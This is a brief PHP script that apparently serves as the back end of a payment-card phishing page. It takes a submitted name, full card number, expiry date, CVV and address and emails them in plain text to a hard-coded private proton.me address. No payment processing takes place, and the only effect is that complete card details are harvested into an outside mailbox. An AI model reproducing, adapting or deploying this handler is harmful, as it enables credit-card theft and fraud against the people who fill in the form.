<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form values
    $name = htmlspecialchars($_POST['name']);
    $cardNumber = htmlspecialchars($_POST['cardNumber']);
    $expiryDate = htmlspecialchars($_POST['expiryDate']);
    $cvv = htmlspecialchars($_POST['cvv']);
    $address = htmlspecialchars($_POST['address']);

    // Email settings
    $to = 'victorberdugo518@proton.me'; // Replace with your email address
    $subject = 'New Payment Details Submission';
    $message = "
    New payment details submission:

    Full Name: $name
    Card Number: $cardNumber
    Expiry Date: $expiryDate
    CVV: $cvv
    Address: $address
    ";
    $headers = "From: no-reply@example.com\r\n"; // Replace with a valid sender email

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo 'Email sent successfully.';
    } else {
        echo 'Failed to send email.';
    }
} else {
    echo 'Invalid request method.';
}
?>
